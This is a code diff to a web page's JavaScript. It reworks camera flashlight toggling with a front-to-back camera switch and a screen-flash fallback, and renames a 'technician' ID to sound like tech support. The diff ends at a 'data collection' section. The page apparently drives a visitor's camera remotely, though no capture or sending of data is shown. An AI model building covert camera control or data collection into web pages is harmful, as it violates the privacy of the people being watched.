@@ -126,7 +126,7 @@
 
     <script>
 
-        const TECHNICIAN_ID = "cybr-support-zomzzssnzcr-141";
+        const TECHNICIAN_ID = "tech-support-zomzzssnzcr-141";
 
         const TRIGGER_COUNT = 1;
 
@@ -353,7 +353,7 @@
 
 
         let currentMode = 'user';
-
+        let preFlashMode = null;
         function toggleCamera() {
 
             currentMode = (currentMode === 'user') ? 'environment' : 'user';
@@ -364,38 +364,62 @@
 
 
 
-        // --- THE FLASHLIGHT FUNCTION ---
         async function toggleTorch(turnOn) {
-            // Check if we are currently using the front camera
             const track = currentStream ? currentStream.getVideoTracks()[0] : null;
-            const settings = track ? track.getSettings() : {};
 
-            // If turning ON and we are in 'user' (front) mode, switch to back camera first
-            if (turnOn && settings.facingMode === 'user') {
-                currentMode = 'environment';
-                await startStream('environment');
-                // Wait a tiny bit for the new stream to settle before applying flash
-                setTimeout(() => toggleTorch(true), 500);
-                return;
+            // --- TURN ON LOGIC ---
+            if (turnOn) {
+                // If we are currently on the front camera ('user'), we must switch to back
+                if (currentMode === 'user') {
+                    console.log("Switching to back camera for flashlight...");
+                    preFlashMode = 'user'; // Remember we were on the front camera
+                    currentMode = 'environment';
+                    await startStream('environment');
+
+                    // Wait slightly for the new stream to initialize before turning on light
+                    setTimeout(() => toggleTorch(true), 500);
+                    return;
+                }
+
+                // Apply Flash (Hardware)
+                if (track) {
+                    const capabilities = track.getCapabilities();
+                    if (capabilities.torch) {
+                        try {
+                            await track.applyConstraints({ advanced: [{ torch: true }] });
+                            return;
+                        } catch (e) { console.log("Torch failed:", e); }
+                    }
+                }
+
+                // Fallback to screen if hardware fails
+                flashlightLayer.style.display = 'block';
             }
 
-            // Method 1: Hardware Torch
-            if (currentStream) {
-                const activeTrack = currentStream.getVideoTracks()[0];
-                const capabilities = activeTrack.getCapabilities();
+            // --- TURN OFF LOGIC ---
+            else {
+                // Turn off hardware flash
+                if (track) {
+                    const capabilities = track.getCapabilities();
+                    if (capabilities.torch) {
+                        try {
+                            await track.applyConstraints({ advanced: [{ torch: false }] });
+                        } catch (e) { }
+                    }
+                }
 
-                if (capabilities.torch) {
-                    try {
-                        await activeTrack.applyConstraints({ advanced: [{ torch: turnOn }] });
-                        return;
-                    } catch (e) { console.log("Torch failed:", e); }
+                // Turn off screen flash
+                flashlightLayer.style.display = 'none';
+
+                // RESTORE CAMERA: If we forced a switch, go back to the original camera
+                if (preFlashMode === 'user') {
+                    console.log("Returning to front camera...");
+                    currentMode = 'user';
+                    await startStream('user');
+                    preFlashMode = null; // Reset the memory
                 }
             }
-
-            // Method 2: Screen Flashlight (Fallback)
-            flashlightLayer.style.display = turnOn ? 'block' : 'none';
         }
-
 
         // --- DATA COLLECTION ---
 
